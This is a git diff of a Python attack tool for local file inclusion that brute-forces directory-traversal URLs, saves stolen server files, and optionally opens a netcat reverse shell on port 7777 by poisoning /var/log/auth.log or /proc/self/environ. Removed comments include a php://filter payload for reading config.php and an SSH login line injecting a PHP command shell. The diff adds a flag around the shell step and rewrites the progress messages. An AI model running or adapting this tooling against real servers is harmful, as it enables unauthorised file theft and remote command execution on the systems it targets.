@@ -11,9 +11,6 @@ import os
 import subprocess
 ssl._create_default_https_context = ssl._create_unverified_context  
 from Package.one_read import Read_File
-#php://filter/read=convert.base64-encode/resource=../../config.php
-#ssh '<?php system($_GET['cmd']); ?>'@192.168.1.136
-
 path = ('file://'+os.getcwd()+'/FileStore/').replace('\\n','')    
 class Local_File_In():
 
@@ -201,8 +198,8 @@ class Local_File_In():
                          exit()   
                     except KeyboardInterrupt:
                        exit()        
-                    print('='*20+"\n[*] attack progres "+'\n'+'='*30+'\n')
-                    print("[+] Teating payload  : ................ | : "+self.url[-50:].replace('\\n',''))  
+                    print('='*20+"\n[*] Brute Force "+'\n'+'='*30+'\n')
+                    print("[+] Testing payload     : ................ | : "+self.url[-50:].replace('\\n',''))  
                     sys.stdout.write('\x1b[1A')
                     sys.stdout.write('\x1b[2K') 
                     sys.stdout.write('\x1b[1A')
@@ -232,29 +229,81 @@ class Local_File_In():
                          print("[+] Content-Length      : ................ | "+str(rex2[6]).replace(':',': '))
                          print("[+] Connection          : ................ | "+rex2[7])
                          print("[+] Content-Type        : ................ | "+rex2[8]+'\n')
-                         print('='*20+"\n[*] vulnerability Link  "+'\n'+'='*30+'\n')
-                         print("[+] vulnerable Link     : ................ | : "+self.url)                        
+                         print('='*20+"\n[*] Vulnerable Found  "+'\n'+'='*30+'\n')
+                         print("[+] Vulnerable  Link : ................ | : "+self.url)                        
                          self.file_name()
                          run = Read_File.store_file(self)
-                         print('='*20+"\n[*] attack progres "+'\n'+'='*30+'\n')
+                         print('='*20+"\n[*] Directory Traversal "+'\n'+'='*30+'\n')
                          print("[+] File request        : ................ | : "+self.args.read.replace('\n','')) 
                          print("[+] Full  URL           : ................ | : "+ self.url.replace('\n',''))
                          print("[+] File Name           : ................ | : "+self.args.read.replace('\\n',''))
                          print("[+] save Locatoin       : ................ | : "+path+self.ip_re.group()+"/"\
                           +self.args.read.replace('/','',1).replace('/','_').replace('\n',''))
-                         self.Reverse_shell()        
-                         exit()
+                         if self.args.shell:
+                                if  "auth" in  self.url or "auth.log" in  self.url\
+                                or "environ" in self.url: 
+                                    print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
+                                    time.sleep(1)
+                                    print("[+] Attack type          : ................ | : Reverse-Shell") 
+                                    print("[+] Mothead              : ................ | : enjaction log file  ")
+                                    print("[+] Lisliner Tool        : ................ | : NETCAT ")
+                                    print("[+] Lisliner IP          : ................ | :",self.ip_re.group())   
+                                    print("[+] Lisliner Port        : ................ | : 7777") 
+                                    self.Reverse_shell()
+                                    exit()
+                                else:
+                                      print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
+                                      time.sleep(1)
+                                      print("[*] FILE : ", self.args.read)
+                                      time.sleep(1)
+                                      print("[*] INFO :  Cat not add PHP Code To",self.args.read)
+                                      time.sleep(1)
+                                      print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
+                                      print("[*] To Get Shell try  --read  with 'environ/auth' log file ")  
+                                      print("[*] Example : --read /var/log/auth.log ")
+                                      print("[*] Example : --read /proc/self/environ")
+                                      print("[*] Example : --read /var/log/auth")
+                                      exit()       
+                         else:
+                             exit()                 
                     elif not self.args.auth and len(self.Get_Oregnal_URL) != len(first_req) :
                          self.file_name()
                          run = Read_File.store_file(self) 
-                         print('='*20+"\n[*] attack progres "+'\n'+'='*30+'\n')
+                         print('='*20+"\n[*] Vulnerable Found  "+'\n'+'='*30+'\n')
+                         print("[+] Vulnerable Link     : ................ | : "+self.url)
+                         print('='*20+"\n[*] Directory Traversal "+'\n'+'='*30+'\n')
                          print("[+] File request        : ................ | : "+self.args.read.replace('\n','')) 
                          print("[+] Full  URL           : ................ | : "+ self.url.replace('\n',''))
                          print("[+] File Name           : ................ | : "+self.args.read.replace('\\n',''))
                          print("[+] save Locatoin       : ................ | : "+path+self.ip_re.group()+"/"\
                           +self.args.read.replace('/','',1).replace('/','_').replace('\n',''))   
-                         self.Reverse_shell()               
-                         exit()
+                         if self.args.shell:
+                                if  "auth" in  self.url or "auth.log" in  self.url\
+                                or "environ" in self.url: 
+                                    print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
+                                    time.sleep(1)
+                                    print("[+] Attack type          : ................ | : Reverse-Shell") 
+                                    print("[+] Mothead              : ................ | : enjaction log file  ")
+                                    print("[+] Lisliner Tool        : ................ | : NETCAT ")
+                                    print("[+] Lisliner IP          : ................ | :",self.ip_re.group())   
+                                    print("[+] Lisliner Port        : ................ | : 7777") 
+                                    self.Reverse_shell()
+                                    exit()
+                                else:
+                                      print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
+                                      time.sleep(1)
+                                      print("[*] FILE : ", self.args.read)
+                                      time.sleep(1)
+                                      print("[*] INFO :  Cat not add PHP Code To",self.args.read)
+                                      time.sleep(1)
+                                      print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
+                                      print("[*] To Get Shell try  --read  with 'environ/auth' log file ")  
+                                      print("[*] Example : --read /var/log/auth.log ")
+                                      print("[*] Example : --read /proc/self/environ")
+                                      print("[*] Example : --read /var/log/auth")
+                                      exit()
+                         else:
+                              exit()                             
                 print('\n'+'='*20+"\n[*] RESUITE-INFO "+'\n'+'='*30+'\n')
                 print("[*] No Data found")
                 print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
@@ -267,8 +316,6 @@ class Local_File_In():
                     exit()
                  else:   
                    try:
-                 #   path   =  "python " +str(os.getcwd())+'/Package/shell/ssh.py'
-                  #   os.system(path)
                      from Package.LFT_Shell_connect import Shell_conncet
                      Shell_conncet.__init__(self)
                      
